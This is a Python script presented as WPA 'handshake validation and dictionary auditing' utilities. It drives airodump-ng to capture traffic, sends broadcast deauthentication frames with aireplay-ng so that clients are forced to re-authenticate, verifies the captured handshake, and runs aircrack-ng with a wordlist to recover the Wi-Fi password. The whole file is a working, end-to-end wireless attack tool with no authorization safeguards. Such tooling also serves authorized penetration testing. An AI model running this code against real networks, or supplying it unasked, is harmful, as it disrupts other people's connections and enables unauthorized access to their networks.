#!/usr/bin/env python3
"""Utilities for WPA handshake capture validation and dictionary auditing."""

from __future__ import annotations

import re
import shutil
import subprocess
import tempfile
import time
from pathlib import Path


class HandshakeError(RuntimeError):
    """Raised when handshake capture or analysis fails."""


def _require_tool(tool: str) -> None:
    if not shutil.which(tool):
        raise HandshakeError(f"Required tool '{tool}' not found in PATH.")


def deauth_clients(interface: str, bssid: str, channel: str, count: int = 8) -> None:
    """Send deauthentication frames to stimulate WPA handshakes."""
    _require_tool("aireplay-ng")
    cmd = [
        "aireplay-ng",
        "--deauth",
        str(count),
        "-a",
        bssid,
        "-c",
        "FF:FF:FF:FF:FF:FF",
        "--channel",
        str(channel),
        interface,
    ]
    result = subprocess.run(cmd, check=False, capture_output=True, text=True)
    if result.returncode != 0:
        raise HandshakeError(result.stderr.strip() or "Deauth command failed.")


def capture_handshake(
    interface: str,
    bssid: str,
    channel: str,
    output_prefix: str,
    capture_seconds: int = 20,
    deauth_delay: float = 2.0,
    deauth_count: int = 8,
) -> Path:
    """Capture traffic with airodump-ng while forcing clients to re-authenticate."""
    if capture_seconds <= 0:
        raise ValueError("capture_seconds must be > 0")

    _require_tool("airodump-ng")

    output_prefix_path = Path(output_prefix)
    output_prefix_path.parent.mkdir(parents=True, exist_ok=True)

    cmd = [
        "airodump-ng",
        "--bssid",
        bssid,
        "--channel",
        str(channel),
        "--write",
        str(output_prefix_path),
        "--output-format",
        "cap,csv",
        interface,
    ]

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(deauth_delay)
        deauth_clients(interface=interface, bssid=bssid, channel=channel, count=deauth_count)
        time.sleep(max(0, capture_seconds - deauth_delay))
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)

    cap_path = output_prefix_path.with_name(output_prefix_path.name + "-01.cap")
    if not cap_path.exists():
        raise HandshakeError("Capture did not produce a .cap file.")

    return cap_path


def verify_handshake(cap_file: str, bssid: str | None = None) -> bool:
    """Verify whether a capture file contains a WPA handshake.

    Prefers pyrit if installed, otherwise falls back to aircrack-ng.
    """
    cap_path = Path(cap_file)
    if not cap_path.exists():
        raise HandshakeError(f"Capture file not found: {cap_file}")

    if shutil.which("pyrit"):
        cmd = ["pyrit", "-r", str(cap_path), "analyze"]
        result = subprocess.run(cmd, check=False, capture_output=True, text=True)
        output = f"{result.stdout}\n{result.stderr}".lower()
        return "good" in output and "handshake" in output

    _require_tool("aircrack-ng")
    cmd = ["aircrack-ng", str(cap_path)]
    if bssid:
        cmd.extend(["-b", bssid])
    result = subprocess.run(cmd, check=False, capture_output=True, text=True)
    output = f"{result.stdout}\n{result.stderr}"
    return "1 handshake" in output.lower() or "handshake" in output.lower()


def crack_wpa_password(cap_file: str, wordlist_path: str, bssid: str | None = None) -> str | None:
    """Attempt WPA key recovery using aircrack-ng and return the discovered password."""
    _require_tool("aircrack-ng")

    cap_path = Path(cap_file)
    wordlist = Path(wordlist_path)
    if not cap_path.exists():
        raise HandshakeError(f"Capture file not found: {cap_file}")
    if not wordlist.exists():
        raise HandshakeError(f"Wordlist not found: {wordlist_path}")

    with tempfile.TemporaryDirectory(prefix="aircrack_out_") as tmp_dir:
        result_file = Path(tmp_dir) / "aircrack.key"
        cmd = [
            "aircrack-ng",
            "-w",
            str(wordlist),
            "-l",
            str(result_file),
            str(cap_path),
        ]
        if bssid:
            cmd.extend(["-b", bssid])

        result = subprocess.run(cmd, check=False, capture_output=True, text=True)
        if result.returncode not in (0, 1):
            raise HandshakeError(result.stderr.strip() or "aircrack-ng execution failed")

        if result_file.exists():
            key = result_file.read_text(encoding="utf-8", errors="replace").strip()
            return key or None

        match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", result.stdout)
        if match:
            return match.group(1)

    return None
